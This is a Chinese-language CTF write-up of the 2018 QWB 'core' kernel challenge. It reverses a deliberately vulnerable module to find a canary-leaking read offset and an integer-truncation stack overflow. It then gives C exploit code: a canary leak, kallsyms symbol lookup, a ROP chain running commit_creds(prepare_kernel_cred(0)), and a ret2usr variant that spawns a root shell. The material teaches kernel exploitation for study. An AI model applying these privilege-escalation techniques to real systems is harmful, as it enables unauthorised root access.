### 										Core-Writeup

题目来源：2018强网杯



#### 文件解析

题目压缩包里有四个文件

* bzImage：压缩过的kernel映像
* vmlinux：未压缩的kernel（如果题目不包含`vmlinux`，可以`extract_vmlinux ./bzImage > ./vmlinux`获取。
* core.cpio：文件系统，这里在后续解压时发现实际格式是`*.cpio.gz`
* start.sh：qemu启动系统的配置

##### 修改文件系统

存在漏洞的module就在文件系统中，并且后续的exp也需要打包进文件系统。所以需要对文件系统解包和重新打包。

* 解包

  ```
  mkdir core
  cp core.cpio ./core/core.cpio.gz
  cd core
  gunzip ./core.cpio.gz 
  cpio -idm < ./core.cpio
  ```

* 打包

  ```
  find . -print0 \
  | cpio --null -ov --format=newc \
  | gzip -9 > core.cpio.gz
  ```

##### 寻找目标文件

解包文件系统后，分析`init`文件，发现`core.ko`即是存在漏洞的模块

```shell
#!/bin/sh
mount -t proc proc /proc
mount -t sysfs sysfs /sys
mount -t devtmpfs none /dev
/sbin/mdev -s
mkdir -p /dev/pts
mount -vt devpts -o gid=4,mode=620 none /dev/pts
chmod 666 /dev/ptmx
cat /proc/kallsyms > /tmp/kallsyms				//将内核符号信息写到了/tmp/kallsyms
echo 1 > /proc/sys/kernel/kptr_restrict			// KPTR_restict，不能读/proc/kallsyms（内容都是0000）
echo 1 > /proc/sys/kernel/dmesg_restrict		// 不能通过dmesg查看kernel信息了
ifconfig eth0 up
udhcpc -i eth0
ifconfig eth0 10.0.2.15 netmask 255.255.255.0
route add default gw 10.0.2.2 
insmod /core.ko				## 加载内核模块

poweroff -d 120 -f &		## 设置了定时自动关机 可以删除掉
setsid /bin/cttyhack setuidgid 1000 /bin/sh		##sh 权限非root
echo 'sh end!\n'
umount /proc
umount /sys

poweroff -d 0  -f
```

目标文件开启`CANARY`和`NX`保护。

```
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : disabled
```

#### 漏洞分析

* init_module

  ```c
  __int64 init_module()
  {
    core_proc = proc_create("core", 438LL, 0LL, &core_fops);
    printk(&unk_2DE);
    return 0LL;
  }
  ```

  创建device：`core`，并指定其`file_operations `为`core_fops`，其中定义了`write`、`ioctl`和`release`指针。

* core_write

  ```c
  __int64 __fastcall core_write(__int64 a1, __int64 a2, unsigned __int64 a3)
  {
    printk(&unk_215);
    if ( a3 <= 0x800 && !copy_from_user(&name, a2, a3) )// 用户层可以修改全局变量name
      return (unsigned int)a3;
    printk(&unk_230);
    return 0xFFFFFFF2LL;
  }
  ```

  该函数允许修改全局变量`name`，即对device描述符的写操作，都将写入`name`。

* core_ioctl：用户态和core内核模块的交互入口

  ```c
  __int64 __fastcall core_ioctl(__int64 a1, int a2, __int64 a3)
  {
    switch ( a2 )
    {
      case 0x6677889B:
        core_read(a3);
        break;
      case 0x6677889C:
        printk(&unk_2CD);
        off = a3;
        break;
      case 0x6677889A:
        printk(&unk_2B3);
        core_copy_func(a3);
        break;
    }
    return 0LL;
  }
  ```

  提供了三种`command`，调用`core_read \ core_copy_func`和设置`off`变量。

* read

  ```c
  unsigned __int64 __fastcall core_read(__int64 a1)
  {
    char *v2; // rdi
    __int64 i; // rcx
    unsigned __int64 result; // rax
    char v5[64]; // [rsp+0h] [rbp-50h] BYREF
    unsigned __int64 v6; // [rsp+40h] [rbp-10h]
  
    v6 = __readgsqword(0x28u);
    printk(&unk_25B);
    printk(&unk_275);
    v2 = v5;
    for ( i = 16LL; i; --i )
    {
      *(_DWORD *)v2 = 0;
      v2 += 4;
    }
    strcpy(v5, "Welcome to the QWB CTF challenge.\n");
    result = copy_to_user(a1, &v5[off], 64LL);    // 将read的参数复制到v5
    if ( !result )
      return __readgsqword(0x28u) ^ v6;
    __asm { swapgs }
    return result;
  }
  ```

  通过`read`可以将内核栈上数据拷贝到用户缓冲区，虽然长度只有`64`，但是`off`是可控的，导致可以用于泄漏信息。

* copy

  ```c
  __int64 __fastcall core_copy_func(__int64 a1)
  {
    __int64 result; // rax
    _QWORD v2[10]; // [rsp+0h] [rbp-50h] BYREF
  
    v2[8] = __readgsqword(0x28u);
    printk(&unk_215);
    if ( a1 > 0x3F )
    {
      printk(&unk_2A1);
      result = 0xFFFFFFFFLL;
    }
    else
    {
      result = 0LL;
      qmemcpy(v2, &name, (unsigned __int16)a1);   // a1原类型是signed int64，这里是unsigned int16
    }
    return result;
  }
  ```

  通过`copy`将`name`的指定长度内容复制到内核栈上，虽然对参数做了检查，但由于`unsigned int64`到`signed int16`的转换，导致检查无效，例如，当传进`0xffffffffffff0000 - 0xffffffffffffffff`之间的值就可以绕过，`0xffffffffffff0100`直接导致溢出，溢出的内容由全局变量`name`决定。

* write

  ```c
  __int64 __fastcall core_write(__int64 a1, __int64 a2, unsigned __int64 a3)
  {
    printk(&unk_215);
    if ( a3 <= 0x800 && !copy_from_user(&name, a2, a3) )// 用户层可以修改全局变量name
      return (unsigned int)a3;
    printk(&unk_230);
    return 4294967282LL;
  }
  ```

  允许用户层修改全局变量`name`的内容，结合copy可以形成可控的内核栈溢出。

#### 启动

启动配置如下，开启了**KALSR**，`-m`给的内存不够，我的环境下需要`256`，不然开启报错`Out-Of-Memory`。

```
qemu-system-x86_64 \
-m 64M \
-kernel ./bzImage \
-initrd  ./core.cpio \
-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr" \
-s  \
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
-nographic  \

```

#### 调试

* qemu + gdb远程调试

  在启动时指定`-s`参数，启动后在`host`主机执行下命令

  ```
  gdb ./vmlinux
  target remote 0.0.0.0:1234
  ```

* 加载模块符号

  上述步骤虽然加载了kernel符号表，但是没加载需要调试的模块`core.ko`的符号表

  需要修改`init`文件

  ```
  setsid /bin/cttyhack setuidgid 0 /bin/sh			## root权限
  ```

  获取`core.ko`的加载基地址

  ```
  cat /sys/modules/core/section/.text
  ```

  通过gdb执行`add-symbol-file  core.ko textaddr`加载符号。

#### 漏洞利用

* 利用思路Kernel-ROP

  * 利用`set-off`设置合适的off值，通过`read`泄漏canary。
  * 利用`/tmp/kallsyms`获取`commit_creds`和`prepare_kernel_cred`函数地址，也能内核加载基地址，确定gadgets地址。
  * 通过write向name写，布置ROPchain
  * 通过copy向内核栈溢出
  * rop执行`commit_creds(prepare_kernel_cred(0))`。
  * 返回user-land，执行`system("/bin/sh")`。

* 利用思路Ret2usr

  由于**用户进程空间不能访问内核空间，而内核则能访问用户进程空间**，并且没有开启`SMEP`和`SMAP`保护，所以上述部分ROP（获取root权限）是可以直接改为执行UserLand的代码的。

* 利用代码（ROP）

  * 保存原UserLand寄存器状态，用户后续返回UserLand

    ```c
    void save_state()
    {
        __asm__(
            ".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax;"
            );
        puts("[*] Saved state");
    }
    ```

  * 泄漏canary

    ```c
    void leak_canary()
    {
    	core_setoff(0x40);
    	core_read();
    	cookie = user_read_buffer[0];
    	printf("[*] Leaked canary : 0x%lx\n", cookie);
    	return ;
    }
    ```

  * 内核态切换到用户态

    `swapgs`切换到用户态GS，`iretq`回复用户态栈帧。

  * 使用`Ropper`寻找ROP gadgets。

  * 通过`/tmp/kallsyms`找符号信息，计算内核加载基地址

    ```c
    size_t find_symbols()
    {
        FILE* kallsyms_fd = fopen("/tmp/kallsyms", "r");
        /* FILE* kallsyms_fd = fopen("./test_kallsyms", "r"); */
    
        if(kallsyms_fd < 0)
        {
            puts("[*]open kallsyms error!");
            exit(0);
        }
    
        char buf[0x30] = {0};
        while(fgets(buf, 0x30, kallsyms_fd))
        {
            if(commit_creds & prepare_kernel_cred)
                return 0;
    
            if(strstr(buf, "commit_creds") && !commit_creds)
            {
                /* puts(buf); */
                char hex[20] = {0};
                strncpy(hex, buf, 16);
                /* printf("hex: %s\n", hex); */
                sscanf(hex, "%llx", &commit_creds);
                printf("commit_creds addr: %p\n", commit_creds);
                /*
                 * give_to_player [master●●] bpython
                    bpython version 0.17.1 on top of Python 2.7.15 /usr/bin/n
                    >>> from pwn import *
    				>>> f = ELF("./vmlinux")
    				[*] 'f:\\kernel\\CTF\\core_give\\give_to_player\\vmlinux'
    				    Arch:     amd64-64-little
    				    Version:  4.15.8
    				    RELRO:    No RELRO
    				    Stack:    Canary found
    				    NX:       NX disabled
    				    PIE:      No PIE (0xffffffff81000000)
    				    RWX:      Has RWX segments
                */
                vmlinux_base = commit_creds - 0x9c8e0;
                printf("vmlinux_base addr: %p\n", vmlinux_base);
            }
            vmlinux_ram_base = 0xffffffff81000000;
            if(strstr(buf, "prepare_kernel_cred") && !prepare_kernel_cred)
            {
                /* puts(buf); */
                char hex[20] = {0};
                strncpy(hex, buf, 16);
                sscanf(hex, "%llx", &prepare_kernel_cred);
                printf("prepare_kernel_cred addr: %p\n", prepare_kernel_cred);
                vmlinux_base = prepare_kernel_cred - 0x9cce0;
                /* printf("vmlinux_base addr: %p\n", vmlinux_base); */
            }
        }
    
        if(!(prepare_kernel_cred & commit_creds))
        {
            puts("[*]Error!");
            exit(0);
        }
    
        printf("[*] commit_creds : 0x%lx\n", commit_creds);
        printf("[*] prepare_kernel_cred : 0x%lx\n", prepare_kernel_cred);
        return ;
    
    }
    ```

  * 构造的RopChain

    ```
    	size_t rop[0x100];
    	int i;
    	for(i = 0; i < 10; i++)
    	{
    		rop[i] = 0x11223344;
    	}
    	rop[8] = cookie;					// set canary
    
    	rop[i++] = pop_rdi_ret;							// pop  rdi; ret
    	rop[i++] = 0;
    	rop[i++] = prepare_kernel_cred;
    
    	// 这一段有些难理解
    	// 第一次考虑可能是注释中的错误方式
    	// 主要是因为 call 操作的副作用 有 "push next_addr"，会破坏原有的rop chain, 所以
    	//	利用 call "pop rcx; ret"抵消这种副作用，并返回原有的ropchain执行。
    	/*
    	rop[i++] = pop_rdx_ret;						// rdx ==> pop_rcx_ret
    	rop[i++] = commit_creds;						
    	rop[i++] = mov_rdi_rax_call_rdx; 			// call ==> pop rcx ; ret 
    	*/
    	
    	rop[i++] = pop_rdx_ret;						// rdx ==> pop_rcx_ret
    	rop[i++] = pop_rcx_ret;						
    	rop[i++] = mov_rdi_rax_call_rdx; 			// call ==> pop rcx ; ret 
    	rop[i++] = commit_creds;
    
    	rop[i++] = swapgs_pop_ret;					// swapgs; 
    	rop[i++] = 0;
    	rop[i++] = iretq_ret;
    	rop[i++] = (size_t)get_shell;
    	rop[i++] = user_cs;
    	rop[i++] = user_rflags;
    	rop[i++] = user_sp;
    	rop[i++] = user_ss;
    
    ```

  * 触发漏洞溢出

    ```c
    	write(fd, rop, 0x100 * 8);				// core_wrte
    	core_copy(0xffffffffffff0000 | 0x100);
    ```

* 利用代码（Ret2user）

  * 只有Ropchain上的差异，不需要构造获取root权限的ROP，而直接执行UserLand代码

    ```c
    
    void get_root()
    {
    	char* (*pkc)(int) = prepare_kernel_cred;
        void (*ccs)(char*) = commit_creds;
        (*ccs)((*pkc)(0));
        //puts("[*] root now.");			// kernel can't address the string
        return ;
    }
    
    	rop[8] = cookie;					// set canary
    	rop[i++] = (size_t)get_root;		// get root pri
    
    	rop[i++] = swapgs_pop_ret;					// swapgs; 
    	rop[i++] = 0;
    	rop[i++] = iretq_ret;
    	rop[i++] = (size_t)get_shell;
    	rop[i++] = user_cs;
    	rop[i++] = user_rflags;
    	rop[i++] = user_sp;
    	rop[i++] = user_ss;
    
    ```

    

